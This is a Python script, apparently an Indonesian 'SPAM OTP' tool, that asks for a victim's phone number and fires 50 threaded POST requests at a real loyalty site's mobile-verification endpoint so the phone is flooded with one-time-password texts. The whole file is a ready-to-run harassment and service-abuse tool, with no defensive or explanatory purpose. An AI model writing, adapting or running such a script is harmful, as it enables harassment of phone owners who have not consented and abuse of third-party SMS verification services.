import requests
import threading
import time
import os

def send_otp(nomor):
    try:
        url = "https://id.jagreward.com/member/verify-mobile"
        headers = {
            "User-Agent": "Mozilla/5.0",
            "Content-Type": "application/x-www-form-urlencoded"
        }
        data = {
            "mobile": nomor
        }
        r = requests.post(url, headers=headers, data=data)
        if r.status_code == 200:
            print(f"Success Send to {nomor}")
        else:
            print(f"Gagal Kirim [{r.status_code}]")
    except Exception as e:
        print(f"Error: {e}")

def start_spam(nomor, jumlah=50):
    threads = []
    for _ in range(jumlah):
        t = threading.Thread(target=send_otp, args=(nomor,))
        t.start()
        threads.append(t)
        time.sleep(0.2)  # total ~10 detik untuk 50 thread

    for t in threads:
        t.join()

    print("\nSelesai mengirim spam!")

def menu():
    os.system("clear")
    print("=== SPAM OTP - FROGZZ ===")
    print("[1] Spam OTP Via Nomor Handphone")
    pilihan = input("Pilih Menu: ")
    if pilihan == "1":
        nomor = input("Nomor Target (cth: 628xxxxxx): ")
        print(f"\nProcess Send To {nomor}\n")
        start_spam(nomor)
    else:
        print("Pilihan tidak tersedia.")

if __name__ == "__main__":
    menu()